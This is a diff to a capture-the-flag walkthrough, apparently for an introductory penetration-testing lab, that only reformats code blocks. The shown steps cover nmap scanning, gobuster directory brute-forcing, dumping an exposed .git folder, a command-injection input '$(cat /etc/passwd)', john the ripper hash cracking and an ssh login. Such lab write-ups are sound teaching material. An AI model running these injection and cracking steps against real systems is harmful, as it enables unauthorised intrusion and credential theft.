@@ -21,21 +21,21 @@ This CTF is meant to be an introduction to penetration testing, where very step 
 
 ### Flag 1
 The first flag is after performing a port scan with nmap.
-
-```$ nmap -p- hackme.42berlin.de```
-
+```
+$ nmap -p- hackme.42berlin.de
+```
 After scanning all ports, nmap shows that the ports 22, 4242 and 42424 are open. The flag is present in the port 42424.
 
 ### Flag 2
 The second flag is found after brute-forcing the directories running on port 4242. Also a .git folder is present.
-
-```$ gobuster dir -u http://hackme.42berlin.de:4242 -w /usr/share/wordlists/fuzzing_wordlist.txt```
-
+```
+$ gobuster dir -u http://hackme.42berlin.de:4242 -w /usr/share/wordlists/fuzzing_wordlist.txt
+```
 ### Flag 3
 For the third flag, it is necessary to read the source code of the application. In order to do this, the tool gitdumper is available.
-
-```$ git-dumper http://hackme.42berlin.de/.git /tmp/ctf_git_dump```
-
+```
+$ git-dumper http://hackme.42berlin.de/.git /tmp/ctf_git_dump
+```
 After dumping the source code, two interesting things are found:
 - The flag
 - Credentials to authenticate as an administrator in the application
@@ -56,9 +56,9 @@ Input to get the hash:
 "$(cat /etc/passwd)"
 
 To crack the hash, the tool john the ripper is provided.
-
-```$ john hash.txt –wordlist=/usr/share/wordlists/password_wordlists.txt```
-
+```
+$ john hash.txt –wordlist=/usr/share/wordlists/password_wordlists.txt
+```
 To get the flag, login via ssh as pedro:
 ```
 $ ssh -p 22 pedro@hackme.42berlin.de
